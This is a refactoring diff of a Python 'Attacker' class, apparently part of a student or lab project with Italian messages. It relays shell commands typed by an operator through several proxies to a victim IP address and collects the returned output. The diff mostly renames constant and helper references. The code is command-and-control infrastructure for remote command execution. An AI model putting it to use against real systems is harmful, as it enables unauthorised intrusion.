@@ -93,7 +93,7 @@ def unisciDati(dati_separati:dict[str:list]):
     for index in range(len(dati_separati)): 
         #print("DATI: ",dati_separati.get(str(index))) 
         for data in dati_separati.get(str(index)):
-            if data[2]==mymethods.LAST_PACKET:
+            if data[2]==LAST_PACKET:
                 continue
             payload.append(data[2])
     return payload
@@ -164,14 +164,14 @@ def get_connected_proxy(proxy_list:list[ipaddress.IPv4Address], ip_vittima:ipadd
             socket_proxy.close() 
             proxy_list.pop(proxy_list.index(proxy))
             continue 
-        data=(mymethods.CONFIRM_ATTACKER+ip_vittima.compressed+"||"+mymethods.ATTACK_FUNCTION+next(iter(attack_function.items()))[0])
+        data=(CONFIRM_ATTACKER+ip_vittima.compressed+"||"+ATTACK_FUNCTION+next(iter(attack_function.items()))[0])
         socket_proxy.sendall(data.encode())
 
         data=socket_proxy.recv(1024).decode()
         print(f"Socket {proxy} Received: {data}") 
-        if not data or data!=(mymethods.CONFIRM_PROXY+ip_vittima.compressed+proxy.compressed):
+        if not data or data!=(CONFIRM_PROXY+ip_vittima.compressed+proxy.compressed):
             print(f"Close connection for {proxy}")  
-            socket_proxy.sendall(mymethods.END_COMMUNICATION.encode())
+            socket_proxy.sendall(END_COMMUNICATION.encode())
             socket_proxy.close()
             proxy_list.pop(proxy_list.index(proxy)) 
             continue
@@ -204,7 +204,7 @@ def set_proxy_list(config_file):
 def setIP_host():
     while True:
         try:
-            ip_host, errore=mymethods.find_local_IP() 
+            ip_host, errore=ipinterface.find_local_IP() 
             if ip_host is not None and ipaddress.ip_address(ip_host): 
                 ip_host=ipaddress.ip_address(ip_host) 
                 print("***IP host: ",type(ip_host),ip_host)
@@ -257,13 +257,13 @@ def get_args_from_parser():
     parser = argparse.ArgumentParser()
     parser.add_argument("--file_path",type=str, help="File di configurazione")  
     try:
-        args, unknown =mymethods.check_for_unknown_args(parser)  
+        args, unknown =myparser.check_arguments(parser)  
         if len(unknown) > 0: 
             raise Exception(f"Argomenti sconosciuti: {unknown}") 
         if check_value_in_parser(args):  
             return args
     except Exception as e:
-        mymethods.print_parser_supported_arguments(parser)
+        myparser.print_supported_arguments(parser)
         raise Exception(f"get_args_from_parser: {e}") 
 
 #-----------------------------------------  
@@ -294,13 +294,13 @@ class Attacker:
                 self.received_data.update({proxy.compressed:[]}) 
             self.dati_separati={}
         except Exception as e:
-            print(f"__init__ main variable: {e}", file=sys.stderr)
+            print(f"__init__ main variable: {e}", file=sys.stderr) 
             exit(1)  
         
         try: 
             self.thread_list, self.dict_proxy_socket=get_connected_proxy(
                 self.proxy_list, self.ip_vittima, self.wait_proxy_update, 
-                self.attack_function
+                self.attack_function 
             )  
             print(f"Got all connected proxy") 
             if len(self.proxy_list)<=0:
@@ -330,7 +330,7 @@ class Attacker:
         
         try:
             proxy_socket=self.dict_proxy_socket.get(proxy.compressed)
-            confirm_text=mymethods.CONFIRM_VICTIM + self.ip_vittima.compressed+proxy.compressed  
+            confirm_text=CONFIRM_VICTIM + self.ip_vittima.compressed+proxy.compressed  
             data_received=proxy_socket.recv(1024).decode()
             if confirm_text not in data_received: 
                 self.dict_proxy_socket.pop(proxy.compressed)
@@ -364,7 +364,7 @@ class Attacker:
         
         msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
         command=input(msg) 
-        while command.lower() not in mymethods.exit_cases: 
+        while command.lower() not in exit_cases: 
             print(f"Il comando immesso è: {command}")
             try:
                 chosen_proxy=random.choice(self.proxy_list)
@@ -374,13 +374,13 @@ class Attacker:
                 continue
             print(f"Il comando {command} verrà mandato al proxy {chosen_proxy}") 
             socket= self.dict_proxy_socket.get(chosen_proxy.compressed)
-            data=(mymethods.CONFIRM_COMMAND+command)
+            data=(CONFIRM_COMMAND+command)
             socket.sendall(data.encode())
             print(f"Gli altri proxy ascolteranno direttamente la vititma")
             for proxy in self.proxy_list:
                 if proxy!=chosen_proxy :
                     socket= self.dict_proxy_socket.get(proxy.compressed)
-                    socket.sendall(mymethods.WAIT_DATA.encode())  
+                    socket.sendall(WAIT_DATA.encode())  
             
             for thread in self.thread_list.values(): 
                 thread.join()   
@@ -405,7 +405,7 @@ class Attacker:
         print("Uscita dalla shell\texit")  
         for proxy in self.proxy_list:
             socket_proxy=self.dict_proxy_socket.get(proxy.compressed)
-            socket_proxy.sendall(mymethods.END_COMMUNICATION.encode()) 
+            socket_proxy.sendall(END_COMMUNICATION.encode()) 
             socket_proxy.close()
 
     def wait_data_from_proxy(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address):  
@@ -423,7 +423,7 @@ class Attacker:
             proxy_data.append(data) 
             self.data_lock.release()
             print(f"Received from proxy: {proxy_data}")
-            if mymethods.LAST_PACKET.encode() in data:
+            if LAST_PACKET.encode() in data:
                 break
         print("Received all data") 
         return 
